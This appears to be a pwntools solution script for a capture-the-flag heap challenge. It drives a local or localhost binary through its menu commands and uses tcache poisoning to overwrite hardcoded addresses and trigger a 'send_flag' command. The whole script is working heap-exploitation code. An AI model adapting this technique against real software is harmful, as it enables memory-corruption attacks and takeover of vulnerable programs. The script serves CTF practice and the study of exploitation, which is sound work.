from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.binary = chall = ELF("./puzzle_patched", checksec=False)

if args.REMOTE:
    p = remote("127.0.0.1", 5000)
elif args.GDB:
    p = gdb.debug([chall.path], env={})
else:
    p = process([chall.path], env={})

def enc(v):
    if isinstance(v, bytes):
        return v
    if isinstance(v, str):
        return v.encode()
    if isinstance(v, int):
        return str(v).encode()
    raise AssertionError()

def cmd(op, *args):
    p.recvuntil(b"enter command: ")
    p.send(op.encode())
    for a in args:
        p.send(b" " + enc(a))
    p.sendline()

def malloc(ind, size, content=b"A"):
    return cmd("stand_create", ind, size, content)

def free(ind):
    return cmd("stand_delete", ind)

def scanf(ind, pay):
    return cmd("stand_rename", ind, pay)

def puts(ind):
    cmd("simulate", ind)
    p.recvuntil(b"AI ANALYSIS FOR ")
    return p.recvuntil(" 🤖".encode("utf-8"))


# secret_addr = chall.sym["g_debug_control"] + 266
secret_addr_1 = 0x406200
secret_addr_2 = 0x40630a
print(f"secret_addr: {hex(secret_addr_2)}")

size = 128
def tcache_poison(addr, content=b"A"):
    malloc(0, size)
    malloc(1, size)
    free(0)
    free(1)
    # input("cont?")
    scanf(1, pack(addr - 0x8))
    # input("cont?")
    malloc(2, size)
    malloc(3, size, content)
    # 3 now contains secret but it gets discarded
    # malloc nulled out the second qword though

tcache_poison(secret_addr_2)
tcache_poison(secret_addr_1, b"AAAABBBBCCCC")
input("cont?")
cmd("send_flag CCCC")
p.sendline(b"quit")

print(end=p.recvall().decode())

